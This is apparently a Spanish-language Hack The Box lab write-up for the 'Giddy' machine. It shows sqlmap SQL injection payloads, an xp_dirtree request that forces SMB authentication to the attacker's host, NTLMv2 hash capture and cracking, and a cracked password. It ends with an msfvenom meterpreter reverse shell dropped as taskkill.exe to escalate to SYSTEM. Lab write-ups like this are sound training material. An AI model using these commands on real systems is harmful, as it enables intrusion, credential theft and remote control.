---
tags:
title: Giddy - Medium (HTB)
permalink: /Giddy-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p80,443,3389,5985 10.129.96.140
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 00:47 EST
Nmap scan report for 10.129.96.140
Host is up (0.51s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2025-12-17T05:50:36+00:00; +2m26s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-17T05:50:36+00:00; +2m26s from scanner time.
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2025-12-16T05:46:35
|_Not valid after:  2026-06-17T05:46:35
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m25s, deviation: 0s, median: 2m25s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.16 seconds

```

## Website / Port 80

Tanto en las web del puerto `80` como la web por SSL en el puerto `443` muestran la misma imagen

![image-center](/assets/images/Pasted image 20251217024902.png)

## Feroxbuster enumeration

Gracias a `feroxbuster` descubrí tres rutas

```bash
feroxbuster -u http://giddy.htb -C 404,500 
<SNIP>
[########>-----------] - 8m    431054/1020187 12m     found:2129    errors:5873   
[################>---] - 8m     24772/30000   51/s    http://giddy.htb/ 
[################>---] - 8m     24427/30000   51/s    http://giddy.htb/aspnet_client/ 
[###########>--------] - 7m     17983/30000   42/s    http://giddy.htb/Aspnet_client/ 
[##########>---------] - 7m     15315/30000   37/s    http://giddy.htb/mvc/
##########>---------] - 7m     15315/30000   37/s    http://giddy.htb/Remote/
<SNIP>
```
## Remote

En esta ruta veo un panel de login que me obliga a usarlo por `HTTPS`, pero sin credenciales no puedo hacer nada.

![image-center](/assets/images/Pasted image 20251217025111.png)

## MVC

Dentro de esta ruta, veo una pagina con artículos y además una sección en la que me puedo `loguear`, que además intentando con credenciales invalidas, ni siquiera puedo enumerar usuarios.

![image-center](/assets/images/Pasted image 20251217025849.png)
### SQL Injection

Si clickeo en cualquiera de los articulos, veo que me redirige a `http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=26`.

![image-center](/assets/images/Pasted image 20251217043421.png)

Y si coloco una `'` para intentar romper la `query`, veo el siguiente error:   

![image-center](/assets/images/Pasted image 20251217030016.png)
### xp_dirtree

Como la Inyección es valida, decidí ponerme a enumerar con `sqlmap`.

```bash
sqlmap -u 'http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=5'  --batch -p 'ProductSubCategoryId' --dbs --dbms=mssql
<SNIP>
Parameter: ProductSubCategoryId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ProductSubCategoryId=5 AND 2856=2856

    Type: inline query
    Title: Generic inline queries
    Payload: ProductSubCategoryId=(SELECT CONCAT(CONCAT(CHAR(113)+CHAR(122)+CHAR(120)+CHAR(120)+CHAR(113),(CASE WHEN (5911=5911) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)))

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ProductSubCategoryId=5 AND 9497 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (9497=9497) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: ProductSubCategoryId=5;WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: ProductSubCategoryId=5 WAITFOR DELAY '0:0:5'

    Type: UNION query
    Title: Generic UNION query (NULL) - 25 columns
    Payload: ProductSubCategoryId=5 UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(120)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(99)+CHAR(107)+CHAR(116)+CHAR(88)+CHAR(104)+CHAR(85)+CHAR(98)+CHAR(77)+CHAR(84)+CHAR(76)+CHAR(104)+CHAR(89)+CHAR(114)+CHAR(102)+CHAR(113)+CHAR(106)+CHAR(100)+CHAR(120)+CHAR(120)+CHAR(111)+CHAR(121)+CHAR(100)+CHAR(82)+CHAR(85)+CHAR(109)+CHAR(111)+CHAR(115)+CHAR(68)+CHAR(109)+CHAR(112)+CHAR(111)+CHAR(75)+CHAR(98)+CHAR(79)+CHAR(109)+CHAR(115)+CHAR(112)+CHAR(79)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bsVX
<SNIP>

---
[01:30:52] [INFO] testing Microsoft SQL Server
[01:30:52] [INFO] confirming Microsoft SQL Server
[01:31:00] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2016 or 2022 or 10 or 11
web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2016
[01:31:00] [INFO] fetching database names
available databases [5]:
[*] Injection
[*] master
[*] model
[*] msdb
[*] tempdb

[01:31:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 17 times
[01:31:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/giddy.htb'                                                                                  

[*] ending @ 01:31:01 /2025-12-17/
<SNIP>
```
## Shell as stacy

Son bases de datos que de adelanto no tienen nada de información, así que como se que es una base de datos `mssql` decidí hacer uso de `xp_dirtree` para poder hacer que la base de datos se conecte a mi recurso compartido desde el cual voy a estar en escuchar de conexiones con `Responder`. Para usar `xp_dirtree` use la siguiente consulta:

```bash
GET /mvc/Product.aspx?ProductSubCategoryId=28;exec%20master.dbo.xp_dirtree%20'\\10.10.17.19\test' HTTP/1.1
```

Y desde responder obtuve el hash del usuario `stacy`
```bash
responder -I tun0
<SNIP>                                                              

[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:7557b676e23c3f06:31380704C9EE3B0F17EA84007E8F0139:010100000000000000E43A71F56EDC01E608C82ABFEB866A0000000002000800570036004300410001001E00570049004E002D00510052004300510045003800570032004A004D00500004003400570049004E002D00510052004300510045003800570032004A004D0050002E0057003600430041002E004C004F00430041004C000300140057003600430041002E004C004F00430041004C000500140057003600430041002E004C004F00430041004C000700080000E43A71F56EDC01060004000200000008003000300000000000000000000000003000004D09B0A28AF2C2907E634D0CA4E01EDC8C2FB5C92AC69C0AA9850CE1B8A46A3C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0031003900000000000000000000000000
```

El hash lo metí en un archivo y lo rompí con `john`

```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)     
1g 0:00:00:00 DONE (2025-12-17 12:50) 2.272g/s 6125Kp/s 6125Kc/s 6125KC/s xamtrex..wyke*ke
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
## Auth

Y valide las credenciales con `nxc`
```bash
nxc winrm giddy.htb -u stacy -p 'xNnWo6272k7x'
WINRM       10.129.96.140   5985   GIDDY            [*] Windows 10 / Server 2016 Build 14393 (name:GIDDY) (domain:Giddy)
WINRM       10.129.96.140   5985   GIDDY            [+] Giddy\stacy:xNnWo6272k7x (Pwn3d!)
```

Y para la conexión use `evil-winrm` con el siguiente comando.

```powershell
evil-winrm -i giddy.htb -u stacy -p 'xNnWo6272k7x'
<SNIP>
*Evil-WinRM* PS C:\Users\Stacy\desktop> cat user.txt
d030fc835bdbd56cb349f537477a32ad
```
## Shell as nt authority\system

Enumerando los directorio me tope con este recurso en el directorio de `stacy`.

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

Lo que parece indicar que `Ubiquiti UnifiVideo` esta instalado en la maquina, además podemos ver una carpeta con su nombre en la ruta `C:\ProgramData`.

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir C:\ProgramData


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   9:23 AM                Comms
d---s-        6/16/2018   9:19 PM                Microsoft
d-----       12/17/2025  12:47 AM                Package Cache
d-----        8/18/2018   4:09 AM                regid.1991-06.com.microsoft
d-----        7/16/2016   9:23 AM                SoftwareDistribution
da----       12/17/2025   2:27 AM                unifi-video
d-----        7/16/2016   9:23 AM                USOPrivate
d-----         6/1/2018   6:03 PM                USOShared
da----         5/4/2021  10:56 AM                VMware
d-----        6/16/2018   9:16 PM                VsTelemetry
```
## Background 

Buscando por `exploits` me encontré con el siguiente [enlace](https://www.exploit-db.com/exploits/43390)

En el mismo explica que cuando el servicio de dicho software se para y vuelve a iniciar, intenta cargar y ejecuta el programa `"C:\ProgramData\unifi-video\taskkill.exe"`, y que dicho binario no esta en la maquina en dicha carpeta, por lo que me abre la posibilidad de crear mi propio binario y colocarlo en esa carpeta, para eso use el siguiente comando.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f exe -o taskkill.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: taskkill.exe
```

Ahora que tengo el binario malicioso, puedo subirlo a la maquina y es ahora cuando tengo que buscar el nombre del servicio que corre para este `Software`, para eso use este comando.

```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* | Where-Object {$_.DisplayName -like "*Ubiquiti*" -or $_.DisplayName -like "*UniFi*"} | Select-Object PSChildName, DisplayName

PSChildName       DisplayName
-----------       -----------
UniFiVideoService Ubiquiti UniFi Video

*Evil-WinRM* PS C:\Users\Stacy\Documents> Get-Service -Name UniFiVideoService

Status   Name               DisplayName
------   ----               -----------
Running  UniFiVideoService  Ubiquiti UniFi Video
```
### Restart service

Como ya tengo el nombre exacto del servicio, solo me queda configurar mi `meterpreter`.

```bash
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.17.19
lhost => 10.10.17.19
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > 
msf exploit(multi/handler) > run
```

Y para reiniciar el servicio directamente use el siguiente comando de `Powershell`.

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> Restart-Service -Name UniFiVideoService -Force
```
## Shell

Y es así como obtuve mi shell como `system` de la maquina.

```powershell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Sending stage (230982 bytes) to 10.129.96.140
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.96.140:49775) at 2025-12-17 02:24:29 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```powershell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
2928dc9e796db856317e3f7cceeb548b
```

`~Happy Hacking.`
